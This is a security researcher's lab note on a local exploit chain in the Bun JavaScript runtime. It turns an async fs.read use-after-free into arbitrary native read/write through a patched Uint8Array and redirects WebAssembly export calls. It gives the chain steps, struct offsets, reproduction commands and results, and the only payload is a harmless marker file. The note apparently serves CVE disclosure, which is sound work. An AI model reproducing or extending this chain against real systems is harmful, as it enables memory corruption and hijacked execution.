# fs UAF real typed-array ARW to wasm command-marker proof

Date: 2026-05-10

Scope: local Bun/JSC exploit development from the confirmed async `fs.read`
BufferSource UAF. No `bun:ffi`, no native helper dylib, no symbol lookup, no
remote service path.

## Summary

The existing WebAssembly export metadata redirection harness now has a
`REAL_TYPEDARRAY_ARW=1` mode. In this mode, the final arbitrary native
reads/writes are performed through a real live `Uint8Array` whose `m_vector`
and `m_length` are temporarily patched, then restored.

This gives a cleaner end-to-end local vulnerability chain:

1. Trigger the async `fs.read` BufferSource UAF.
2. Build the no-FFI `addrof` -> ArrayBuffer metadata bridge.
3. Leak a real `Uint8Array` cell.
4. Patch that real cell's `m_vector` / `m_length` to create a temporary native
   R/W view over known mapped addresses.
5. Use byte indexing on that real `Uint8Array` to read/write WebAssembly export
   function-cell metadata.
6. Redirect a call to module A's export `a()` into module B's same-signature
   import-calling export `b()`.
7. Reach the local JS import marker path, create marker files, and restore
   `a()` to its original return value.

This is stronger than the previous WebAssembly proof because the final
WebAssembly metadata corruption no longer depends directly on repeated
ArrayBuffer metadata retargeting. The final read/write surface is an ordinary
typed-array object after the UAF-built native view has patched its vector.

## Harness

Updated:

- `lab/harnesses/13-arb-rw-probes/wasm-export-code-pointer-redirect-probe.js`

Minimal reviewer entrypoint:

- `lab/harnesses/13-arb-rw-probes/real-typedarray-arw-wasm-command-minimal.js`

New mode:

- `REAL_TYPEDARRAY_ARW=1`
- `REAL_ARW_VIEW_SIZE=128`

Implementation notes:

- The real typed-array R/W helper uses byte-by-byte indexing (`view[i]`) for
  reads and writes.
- It restores the real `Uint8Array` cell's original vector and length after
  each native access.
- The original metadata bridge is still used to patch the real typed-array
  cell. After that, WebAssembly metadata reads/writes flow through the real
  typed-array view.

## Validation

Command:

```sh
rm -f /tmp/bun_uaf_noffi_wasm_marker /tmp/bun_uaf_noffi_command_marker
ASAN_OPTIONS=halt_on_error=1:abort_on_error=0:exitcode=66:detect_leaks=0:detect_stack_use_after_return=1:strict_string_checks=1:check_initialization_order=1:detect_invalid_pointer_pairs=2:fast_unwind_on_fatal=1:malloc_context_size=64:allocator_may_return_null=0:print_stats=0:symbolize=0:print_module_map=0:quarantine_size_mb=0 \
TIMEOUT=240 CROSS_MODULE=1 MARKER_IMPORT=1 COMMAND_IMPORT=1 \
FAKE_DESCRIPTOR=1 FAKE_DESCRIPTOR_MODE=replacement EXTRA_CELL_FIELDS=40 \
REAL_TYPEDARRAY_ARW=1 REAL_ARW_VIEW_SIZE=128 \
MARKER_PATH=/tmp/bun_uaf_noffi_wasm_marker \
COMMAND_MARKER_PATH=/tmp/bun_uaf_noffi_command_marker \
MARKER_COMMAND="printf 'real-typedarray-arw-cross-command:%s\n' \"$$\" > /tmp/bun_uaf_noffi_command_marker" \
lab/scripts/triage.sh \
  lab/harnesses/13-arb-rw-probes/wasm-export-code-pointer-redirect-probe.js
```

Environment:

- Bun binary: `bun/build/release-asan/bun-asan`
- Bun version: `1.3.14`
- ASAN: enabled
- FFI: no
- Native helper dylib: no
- WebAssembly: yes
- JIT / wasm warming: yes, `WARM_ITERATIONS=10000`
- UAF sizes:
  - `8192` for object-array `addrof`
  - `128` for ArrayBuffer metadata bridge
- Reclaim carrier: sprayed `Uint8Array(new ArrayBuffer(128))`
- Stale write offset: `16` in the 128-byte metadata bridge carrier
- Final native R/W surface: real `Uint8Array`
- Real typed-array cell fields:
  - offset `16`: `m_vector`
  - offset `24`: `m_length`
- WebAssembly function-cell fields patched:
  - offset `48`: forged dispatch descriptor pointer
  - offset `40`: cross-module context pointer

Runs:

- `lab/findings/runs/20260510T101405Z-12952/asan.log`
- `lab/findings/runs/20260510T101429Z-14102/asan.log`

Result:

```text
[triage] exit=86
[triage] no crash signature found
```

Representative facts:

```json
{
  "noFfi": true,
  "nativeHelperDylib": false,
  "realTypedArrayArw": true,
  "realArwSummary": {
    "viewSize": 128,
    "rwCellAddress": "0x000062d000f341f0",
    "originalVector": "0x000062d000d9c180",
    "originalLength": "0x0000000000000080"
  },
  "markerBefore": false,
  "markerAfter": true,
  "commandMarkerBefore": false,
  "commandMarkerAfter": true,
  "commandResultAfter": {
    "status": 0,
    "error": null
  },
  "crossModule": true,
  "fakeDescriptor": true,
  "patchField": 48,
  "extraCellFields": [40],
  "beforeA": 42,
  "beforeB": 7,
  "patchedA": 7,
  "restoredA": 42,
  "ok": true
}
```

Marker files from the representative run:

```text
/tmp/bun_uaf_noffi_command_marker: real-typedarray-arw-cross-command:12952
/tmp/bun_uaf_noffi_wasm_marker: wasm-marker:12999
```

Repeat marker files:

```text
/tmp/bun_uaf_noffi_command_marker: real-typedarray-arw-cross-command-repeat:14102
/tmp/bun_uaf_noffi_wasm_marker: wasm-marker:14123
```

Backward-compatibility check:

```sh
ASAN_OPTIONS=halt_on_error=1:abort_on_error=0:exitcode=66:detect_leaks=0:detect_stack_use_after_return=1:strict_string_checks=1:check_initialization_order=1:detect_invalid_pointer_pairs=2:fast_unwind_on_fatal=1:malloc_context_size=64:allocator_may_return_null=0:print_stats=0:symbolize=0:print_module_map=0:quarantine_size_mb=0 \
TIMEOUT=240 CROSS_MODULE=1 MARKER_IMPORT=1 \
FAKE_DESCRIPTOR=1 FAKE_DESCRIPTOR_MODE=replacement EXTRA_CELL_FIELDS=40 \
MARKER_PATH=/tmp/bun_uaf_noffi_wasm_marker_default \
lab/scripts/triage.sh \
  lab/harnesses/13-arb-rw-probes/wasm-export-code-pointer-redirect-probe.js
```

Run:

- `lab/findings/runs/20260510T101449Z-15168/asan.log`

Result: default metadata-bridge mode still exits `86` with `ok: true`.

## Minimal reviewer command

The minimal wrapper fixes the successful proof configuration and removes the
need to pass the generic research harness knobs manually:

```sh
ASAN_OPTIONS=halt_on_error=1:abort_on_error=0:exitcode=66:detect_leaks=0:detect_stack_use_after_return=1:strict_string_checks=1:check_initialization_order=1:detect_invalid_pointer_pairs=2:fast_unwind_on_fatal=1:malloc_context_size=64:allocator_may_return_null=0:print_stats=0:symbolize=0:print_module_map=0:quarantine_size_mb=0 \
TIMEOUT=240 \
lab/scripts/triage.sh \
  lab/harnesses/13-arb-rw-probes/real-typedarray-arw-wasm-command-minimal.js
```

Run:

- `lab/findings/runs/20260510T102808Z-45210/asan.log`

Result:

```json
{
  "realTypedArrayArw": true,
  "markerAfter": true,
  "commandMarkerAfter": true,
  "patchedA": 7,
  "restoredA": 42,
  "ok": true
}
```

Marker files:

```text
/tmp/bun_uaf_noffi_command_marker: minimal-real-typedarray-arw-command:45268
/tmp/bun_uaf_noffi_wasm_marker: wasm-marker:45268
```

## Interpretation

This is a concrete local vulnerability proof, not just an isolated primitive:

- public local JS API trigger: async `fs.read` on a detachable `BufferSource`
- memory safety bug: stale native write into freed/reclaimed JS backing store
- exploit primitive: no-FFI addrof and native memory bridge
- stronger primitive: real `Uint8Array` vector patch used as native R/W
- control-flow target: WebAssembly export function-cell metadata
- observed effect: call to module A export is redirected to module B import
  path, marker files are created, and original behavior is restored

The proof remains scoped:

- It is local-JS exploitability evidence.
- It is not request-reachable remote exploitability.
- It is not direct shellcode execution from JS heap data.
- It relies on attacker-supplied WebAssembly and a local JS import path for
  the command marker.
- It does not prove a standalone `system(command)` chain or ASLR/W^X/PAC
  bypass.

## Disclosure implication

The CVE claim can safely be framed as a serious local-JS memory-safety
vulnerability with demonstrated no-FFI native read/write over known mapped
addresses and WebAssembly dispatch corruption through a real typed-array R/W
view.

Do not frame this as remote RCE.
